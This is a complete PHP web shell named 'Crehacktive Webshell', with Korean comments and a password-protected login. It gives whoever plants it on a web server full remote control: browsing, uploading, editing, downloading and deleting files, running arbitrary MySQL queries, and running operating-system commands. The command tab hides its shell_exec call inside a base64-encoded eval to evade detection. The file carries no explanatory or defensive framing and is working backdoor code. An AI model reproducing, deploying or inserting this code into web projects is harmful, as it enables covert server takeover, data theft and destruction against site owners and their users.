<? 
    session_start();

    header("Content-Type: text/html; charset=UTF-8");
    $mode = $_REQUEST["mode"];
    $path = $_REQUEST["path"];
    $page = basename($_SERVER['PHP_SELF']);
    $fileName = $_GET["fileName"];
    $dbHost = $_POST['dbHost'];
    $dbId= $_POST['dbId'];
    $dbPw = $_POST['dbPw'];
    $dbName = $_POST['dbName'];
    $query = $_POST['query'];
    $inputPw = $_POST['inputPw'];
    $accessPw = '19fbb8b248a686317a5da1d0619df988'; #webshell password
    $accessFlag = $_SESSION['accessFlag']; #플래그 값을 통해 로그인 유무 판단

    if(empty($path)){
        $tempFileName = basename(__FILE__);
        $tempPath = realpath(__FILE__);
        $path = str_replace($tempFileName, "",$tempPath);
        $path = str_replace("\\","/",$path);
    } else {
        $path = realpath($path)."/";
        $path = str_replace("\\","/",$path);

    }

    if($accessFlag=='Y'){
        #mode logic
        if($mode == 'fileCreate'){
            if(empty($fileName)){
                echo "<script>alert('input filename');history.back(-1);</script>";
                exit();
            }
            $fp = fopen($path.$fileName,'w');
            fclose($fp);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }else if($mode == 'dirCreate'){
            if(empty($fileName)){
                echo "<script>alert('input dirname');history.back(-1);</script>";
                exit();
            }
            $dirPath = $path.$fileName;
            if(is_dir($dirPath)){
                echo "<script>alert('exist');history.back(-1);</script>";
                exit();
            }
            mkdir($dirPath);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }else if($mode == 'fileModify' && !empty($_POST['fileContents'])){
            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('file not found');history.back(-1);</script>";
                exit();
            }
            $fileContents = $_POST['fileContents'];
            $fp = fopen($filePath,'w');
            fputs($fp, $fileContents,strlen($fileContents));
            fclose($fp);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

        }else if($mode == 'fileDelete'){
            if(empty($fileName)){
                echo "<script>alert('input filename');history.back(-1);</script>";
                exit();
            }
            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('file not found');history.back(-1);</script>";
                exit();
            }
            if(!unlink($filePath)){
                echo "<script>alert('file delete fail');history.back(-1);</script>";
                exit();
            }
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

        }else if($mode == 'dirDelete'){
            if(empty($fileName)){
                echo "<script>alert('input dirname');history.back(-1);</script>";
                exit();
            }
            $dirPath = $path.$fileName;
            if(!file_exists($dirPath)){
                echo "<script>alert('dir not found');history.back(-1);</script>";
                exit();
            }
            if(!rmdir($dirPath)){
                echo "<script>alert('dir delete fail');history.back(-1);</script>";
                exit();
            }
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }else if($mode == 'fileDownload'){
            if(empty($fileName)){
                echo "<script>alert('input dirname');history.back(-1);</script>";
                exit();
            }

            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('file not found');history.back(-1);</script>";
                exit();
            }
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=\"{$fileName}\"");
            header("Content-Transfer-Encoding: binary");

            readfile($filePath);
            exit();

        }else if($mode == 'fileUpload' && !empty($_FILES['file']['tmp_name'])){
            $filePath = $path.$_FILES['file']['name'];
            if(!move_uploaded_file($_FILES['file']['tmp_name'],$filePath)){
                echo "<script>alert('file upload fail');history.back(-1);</script>";
                exit();
            }    
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }else if($mode == 'logout'){
            unset($_SESSION['accessFlag']);
            session_destroy();
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
        
    }else{
            if($mode=='login' && ($accessPw == md5($inputPw))){
                $_SESSION['accessFlag'] = 'Y';
                echo "<script>location.href='{$page}'</script>";
                exit();
            }
        }
        #directory list return function
        function getDirList($getPath) {
            $listArr = array();
            $handler = opendir($getPath);

            while($file = readdir($handler)){
                if(is_dir($getPath.$file) == '1'){
                    $listArr[] = $file;
                }
            }
            closedir($handler);
            return $listArr;
        }
        #file list return function
        function getFileList($getPath) {
            $listArr = array();
            $handler = opendir($getPath);

            while($file = readdir($handler)){
                if(is_dir($getPath.$file) != '1'){
                    $listArr[] = $file;
                }
            }
            closedir($handler);
            return $listArr;
        }
    
?>
<!DOCTYPE html>
<html lang="ko">

<head>
    <title>Crehacktive Webshell</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    <script>
        function fileCreate(){
            var fileName = frm.createFileName.value;
            if (!fileName){
                alert("input filename");
                return;
            }
            location.href='<?=$page?>?mode=fileCreate&path=<?=$path?>&fileName='+fileName;
        }
        function dirCreate(){
            var fileName = frm.createFileName.value;
            if (!fileName){
                alert("input dirname");
                return;
            }
            location.href='<?=$page?>?mode=dirCreate&path=<?=$path?>&fileName='+fileName;
        }

        function fileModify(fileName){
            location.href='<?=$page?>?mode=fileModify&path=<?=$path?>&fileName='+fileName;
        }

        function dirDelete(fileName){
            if(confirm(fileName + 'dir delete?')==true){
                location.href='<?=$page?>?mode=dirDelete&path=<?=$path?>&fileName='+fileName;
            }
        }
        function fileDelete(fileName){
            if(confirm(fileName + 'file delete?')==true){
                location.href='<?=$page?>?mode=fileDelete&path=<?=$path?>&fileName='+fileName;
            }
        }
        function fileDownload(fileName){
            if(confirm(fileName + 'file download?')==true){
                location.href='<?=$page?>?mode=fileDownload&path=<?=$path?>&fileName='+fileName;
            }
        }

    </script>

</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-3"></div>
            <div class="col-md-6">
                <? if(($accessFlag) != 'Y') {?>  
                    <h3>login</h3>
                    <hr>
                    <form action="<?=$page?>?mode=login" method="POST">
                            <div class="input-group">
                                <span class="input-group-addon">Password</span>
                                <input type="password" class="form-control" placeholder="Password Input..." name="inputPw"> 
                            </div>
                            <br>
                            <p class='text-center'><button class='btn btn-default' type='submit'>Auth</button></a>
                        </form>
                <? } else { ?>

                <h3>Webshell <small>Crehacktive webshell</small></h3>
                <hr>
                <ul class="nav nav-tabs">
                    <li role="presentation" <? if(empty($mode) || $mode == 'fileBrowser') echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
                    <li role="presentation" <? if($mode == 'fileUpload') echo "class=\"active\"";?>><a href="<?=$page?>?mode=fileUpload&path=<?=$path?>">File Upload</a></li>
                    <li role="presentation" <? if($mode == 'command') echo "class=\"active\"";?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
                    <li role="presentation" <? if($mode == 'db') echo "class=\"active\"";?>><a href="<?=$page?>?mode=db">DB connector</a></li>
                    <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
                </ul>
                <br>
                <? if(empty($mode) || $mode == 'fileBrowser') { ?>
                
                <form action="<?=$page?>?mode=fileBrowser" method="GET">
                    <div class="input-group">
                        <span class="input-group-addon">Currnet Path</span>
                        <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path?>"> 
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="submit">Move</button>
                        </span>
                    </div>
                </form>
                <hr>
                <div class="table-resopnsive">
                    <table class="table table-bordered table-hover" style="table-layout: fixed; word-break: break-all;">
                        <thead>
                            <tr class="active">
                                <th style="width:50%" class="text-center">Name</th>
                                <th style="width:14%" class="text-center">Type</th>
                                <th style="width:18%" class="text-center">Date</th>
                                <th style="width:18%" class="text-center">Action</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?
                            $dirList = getDirList($path);
                            for($i=0; $i<count($dirList); $i++) {
                                if($dirList[$i] != '.'){
                                    $dirDate = date("Y-m-d H:i",filemtime($path.$dirList[$i]));
                            ?>
                            <tr>
                                <td style="vertical-align: middle" class="text-primary"><b><span class="glyphicon glyphicon-folder-open"></span>&nbsp;&nbsp;<a href="<?=$page?>?mode=fileBrowser&path=<?=$path?><?=$dirList[$i]?>"><?=$dirList[$i]?></a></b></td>
                                <td style="vertical-align: middle" class="text-center"><kbd>Directory</kbd></td>
                                <td style="vertical-align: middle" class="text-center"><?=$dirDate?></td>
                                <td style="vertical-align: middle" class="text-center">
                                    <? if($dirList[$i] != '..') { ?>
                                    <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                        <button type="button" class="btn btn-danger" title="Directory Delete" onclick="dirDelete('<?=$dirList[$i]?>')"><span class="glyphicon glyphicon-trash" aria-hidden="true" ></button>
                                    </div>
                                    <? } ?>
                                </td>
                            </tr>
                            <? 
                                }
                            }
                            ?>
                            <?
                            $fileList = getFileList($path);
                            for($i=0; $i<count($fileList); $i++) {
                                $fileDate = date("Y-m-d H:i",filemtime($path.$fileList[$i]));
                            ?>
                            <tr>
                                <td style="vertical-align: middle"><span class="glyphicon glyphicon-file"></span> <?=$fileList[$i]?></td>
                                <td style="vertical-align: middle" class="text-center"><kbd>File</kbd></td>
                                <td style="vertical-align: middle" class="text-center"><?=$fileDate?></td>
                                <td style="vertical-align: middle" class="text-center">
                                    <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                        <button type="button" class="btn btn-info" title="File Download" onclick="fileDownload('<?=$fileList[$i]?>')"><span class="glyphicon glyphicon-save" aria-hidden="true"></button>
                                        <button type="button" class="btn btn-warning" title="File Modify" onclick="fileModify('<?=$fileList[$i]?>')"><span class="glyphicon glyphicon-wrench" aria-hidden="true"></button>
                                        <button type="button" class="btn btn-danger" title="File Delete" onclick="fileDelete('<?=$fileList[$i]?>')"><span class="glyphicon glyphicon-trash" aria-hidden="true" ></button>
                                    </div>
                                </td>
                            </tr>
                            <? } ?>
                        </tbody>
                    </table>
                </div>
                <hr>
                <form name="frm">
                    <div class="input-group">
                        <input type="text" class="form-control" placeholder="File/Directory name input.." name="createFileName">
                        <span class="input-group-btn">
                            <button class="btn btn-default" type="button" onclick="fileCreate()">File Create</button>
                            <button class="btn btn-default" type="button" onclick="dirCreate()">Directory Create</button>
                        </span>
                    </div>
                </form>
                <? } else if($mode == 'fileModify') {?>
                <?
                    if(empty($fileName)){
                        echo "<script>alert('file not found);history.back(-1);</script>";
                        exit();
                    }
                    $filePath = $path.$fileName;

                    if(!file_exists($filePath)){
                        echo "<script>alert('file not found);history.back(-1);</script>";
                        exit();
                    }

                    $fp = fopen($filePath,'r');
                    $fileContents = fread($fp,filesize($filePath));
                    fclose($fp);
                ?>
                    <form action="<?=$page?>?mode=fileModify&path=<?=$path?>&fileName=<?=$fileName?>" method="POST">
                        <div class="input-group">
                            <input type="text" class="form-control" value="<?=$path?><?=$fileName?>"> 
                            <span class="input-group-btn">
                                <button class="btn btn-default" type="submit">fileModify</button>
                            </span>
                        </div>
                        <hr>

                        <textarea class="form-control" rows='20' name='fileContents'><?=htmlspecialchars($fileContents)?></textarea>
                    </form>
                    <br>
                    <p class="text-center" ><button class="btn btn-default" type="button" onclick="history.back(-1)">back</button></p>
                    <? } else if($mode == 'fileUpload') {?>
                        <form action="<?=$page?>?mode=fileUpload" method="POST" enctype="multipart/form-data">
                            <div class="input-group">
                                <span class="input-group-addon">Upload Path</span>
                                <input type="text" class="form-control" placeholder="Path Input..." name="path" value="<?=$path?>"> 
                                <span class="input-group-btn">
                                </span>
                            </div>
                            <hr>
                            <div class="form-group">
                                <label for="exampleInputFile">file upload</label>
                                <input type="file" id='exampleInputFile' name='file'>
                                <p class='help-block'>check upload path</p>
                                <p class='text-center'><button class='btn btn-default' type='submit'>File Upload</button></a>

                            </div>
                        </form>
                    <? } else if($mode == 'command') {?>
                        <form action="<?=$page?>?mode=command" method="POST">
                            <div class="input-group">
                                <span class="input-group-addon">command</span>
                                <input type="text" class="form-control" placeholder="command Input..." name="command"> 
                                <span class="input-group-btn">
                                </span>
                            </div>
                            <br>
                            <p class='text-center'><button class='btn btn-default' type='submit'>execution</button></a>
                        </form>
                            <?
                                if(!empty($_POST['command'])){
                                    echo "<hr>";
                                    #$result = shell_exec($_POST["command"]);
                                    eval(base64_decode("JHJlc3VsdCA9IHNoZWxsX2V4ZWMoJF9QT1NUWyJjb21tYW5kIl0pOw=="));
                                    $result = str_replace("\n","<br>",$result);
                                    $result = iconv('CP949','UTF-8',$result);
                                    echo $result;
                                } 
                            ?>
                    <? } else if($mode == 'db') {?>
                    <?  
                        if(empty($dbHost) || empty($dbId) || empty($dbPw) || empty($dbName)){
                    ?>
                        <form action="<?=$page?>?mode=db" method="POST">
                            <div class="input-group">
                                <span class="input-group-addon">HOST</span>
                                <input type="text" class="form-control" placeholder="Host Input..." name="dbHost"> 
                                <span class="input-group-addon">ID</span>
                                <input type="text" class="form-control" placeholder="ID Input..." name="dbId"> 
                                <span class="input-group-addon">PW</span>
                                <input type="text" class="form-control" placeholder="PW Input..." name="dbPw"> 
                                <span class="input-group-addon">DB</span>
                                <input type="text" class="form-control" placeholder="DB Input..." name="dbName"> 
                            </div>
                            <br>
                            <p class='text-center'><button class='btn btn-default' type='submit'>connection</button></a>
                        </form>
                    <? } else { 
                        $dbConn = new mysqli($dbHost, $dbId, $dbPw, $dbName);
                        if($dbConn -> connect_errno){
                            echo "<script>alert('connect fail');history.back(-1);</script>";
                            exit();
                        }

                     ?>
                    <form action="<?=$page?>?mode=db" method="POST">
                        <div class="input-group">
                            <span class="input-group-addon">SQL</span>
                            <input type="text" class="form-control" placeholder="query Input..." name="query" value='<?=$query?>'> 
                        </div>
                        <br>
                        <p class='text-center'><button class='btn btn-default' type='submit'>execution</button></a>
                        <input type="hidden" name="dbHost" value="<?=$dbHost?>">
                        <input type="hidden" name="dbId" value="<?=$dbId?>">
                        <input type="hidden" name="dbPw" value="<?=$dbPw?>">
                        <input type="hidden" name="dbName" value="<?=$dbName?>">
                    </form>
                    <?
                        if(!empty($query)){
                            $result = $dbConn->query($query);
                            $rowCnt = $result->num_rows;
                    ?>
                            <table class="table table-bordered table-hover">
                            <?
                            for($i=0; $i<$rowCnt; $i++){
                                $row = $result->fetch_assoc();
                                if($i==0){
                                    $radio = 100/count($row);
                                    #print columns
                                    ?>
                                    <thead>
                                        <tr class='active'>
                                            <?
                                                foreach($row as $key => $value){
                                            ?>
                                            <th style="width:<?=$radio?>%" class="text-center"><?=$key?></th>
                                            <?
                                                }
                                            ?>
                                        </tr>
                                    </thead>
                                    <tbody>
                                    <?
                                }
                                echo "<tr>";
                                foreach($row as $key => $value){
                                ?>
                                    <td style="vertical-align: middle" class="text-center"><?=$value?></td>

                                <?
                                }
                                echo "</tr>";
                            }
                            ?>
                            </tbody>
                            </table>
                            <?
                        }
                        ?>
                <? } ?>
                <? } ?>
                <? } ?>
                <hr>
                <p class="text-muted text-center">Copyright ~~~, all rights reserved</p>
            </div>
            <div class="col-md-3"></div>
        </div>
    </div>
</body>
</html>
